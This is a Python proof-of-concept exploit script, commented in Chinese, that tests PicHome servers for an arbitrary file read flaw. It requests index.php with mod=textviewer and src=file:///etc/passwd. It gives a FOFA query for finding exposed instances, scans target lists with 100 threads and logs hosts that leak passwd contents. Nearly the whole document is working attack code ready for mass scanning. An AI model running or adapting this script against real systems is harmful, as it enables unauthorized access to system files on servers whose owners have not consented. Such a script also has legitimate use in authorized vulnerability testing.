#Pichome index存在任意文件读取
#fofa：title="PicHome"
import requests,argparse,sys
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库
# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def main():
    # 初始化
    parse = argparse.ArgumentParser(description="Pichome index存在任意文件读取")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file')

    # 实例化
    args = parse.parse_args()

    # 对用户输入的参数做判断 输入正确 url file 输入错误弹出提示
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = [] # 用于接收读取文件之后的url
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
        
    else:
        print(f"Usage python {sys.argv[0]} -h")

def poc(target):
    link = "/index.php?mod=textviewer&src=file:///etc/passwd"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Connection": "close"
    }
    try:
        res1 = requests.get(url=target,headers=headers,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+link,headers=headers,verify=False,timeout=5)
            if "root:x:0:0" in res2.text and "bin:x:1:1" in res2.text:
                print(f"[+]该{target}存在任意文件读取漏洞")
                # 写入到一个文件中
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(f"[+]该{target}存在任意文件读取漏洞\n")
            else:
                print(f"[-]该{target}不存在任意文件读取漏洞")
    except:
        print(f"该{target}存在问题，请手工测试")
# 函数入口

if __name__ == "__main__":
    main()